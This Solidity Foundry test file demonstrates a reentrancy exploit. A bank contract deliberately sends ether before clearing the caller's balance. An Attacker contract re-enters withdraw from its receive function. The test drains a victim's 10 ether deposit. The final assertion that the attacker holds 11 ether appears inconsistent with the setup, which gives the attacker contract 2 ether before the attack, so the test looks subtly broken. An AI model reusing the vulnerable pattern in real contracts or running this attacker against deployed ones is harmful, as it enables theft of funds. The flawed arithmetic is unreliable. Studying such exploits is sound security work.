// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract SimpleBankVulnerable {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 balance = balances[msg.sender];
        require(balance > 0, "So du khong du");
        
        (bool success, ) = msg.sender.call{value: balance}("");
        require(success, unicode"Rut tien thất bai");

        balances[msg.sender] = 0; 
    }
}

contract Attacker {
    SimpleBankVulnerable public bank;

    constructor(address payable _bank) {
        bank = SimpleBankVulnerable(_bank);
    }

    receive() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        require(msg.value >= 1 ether, "Need at least 1 ether");
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }
}

contract ReentrancyTest is Test {
    SimpleBankVulnerable public bank;
    Attacker public attacker;
    address public victim;

    function setUp() public {
        bank = new SimpleBankVulnerable();
        victim = makeAddr("victim");
        vm.deal(victim, 10 ether);
        vm.prank(victim);
        bank.deposit{value: 10 ether}();

        attacker = new Attacker(payable(address(bank)));
        vm.deal(address(attacker), 1 ether);
    }

    function testReentrancyExploit() public {
        uint256 bankBalanceBefore = address(bank).balance;
        assertEq(bankBalanceBefore, 10 ether);

        attacker.attack{value: 1 ether}();

        uint256 bankBalanceAfter = address(bank).balance;
        uint256 attackerBalanceAfter = address(attacker).balance;

        emit log_named_uint("Bank balance after attack", bankBalanceAfter);
        emit log_named_uint("Attacker balance after attack", attackerBalanceAfter);

        assertEq(bankBalanceAfter, 0);
        assertEq(attackerBalanceAfter, 11 ether);
    }
}
